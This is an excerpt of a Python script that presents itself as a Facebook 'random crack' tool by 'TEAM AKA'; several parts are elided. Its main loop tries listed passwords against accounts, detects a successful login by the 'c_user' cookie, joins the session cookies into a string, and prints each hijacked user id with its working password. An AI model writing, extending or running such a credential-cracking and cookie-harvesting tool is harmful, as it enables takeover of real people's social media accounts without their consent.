...
def uaku():
    try:
        ...
        a = requests.get('https://github.com/AKA-404').text
        ua = open('.bbnew.txt', 'w')
...
os.system("xdg-open https://www.facebook.com/groups/461886279105793/permalink/461887065772381/?ref=share")
...
\033[1;32m[+]==============================================
\033[1;32m[+] \033[1;33mCREATED BY   :  \033[1;33mAKA
\033[1;32m[+] \033[1;34mON FACEBOK   :  \033[1;34mARIYAN
\033[1;32m[+] \033[1;35mON GITHUB    :  \033[1;35mAKA
\033[1;32m[+] \033[1;36mTOOL STATUS  :  \033[1;36mRANDOM
\033[1;32m[+] \033[1;36mTOOL VIRSION :  \033[1;36m2.7.1
\033[1;32m[+]==============================================   
            \033[1;31m• \033[1;33m• \033[1;34m• \033[1;36mTEAM AKA  \033[1;31m• \033[1;33m• \033[1;34m• """
BLUE = '\033[1;32m'
...
def main():
    ...
    print(logo)
    print(49 * '=')
    print('[A]\033[1;37m START RANDOM CRACK')
    print(49 * '=')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                coki = ";".join([key + "=" + value for key, value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\033[1;95m[AKA-OK] ' + cid + ' | ' + ps + '\033[0;97m')
                cek_apk(session, coki)
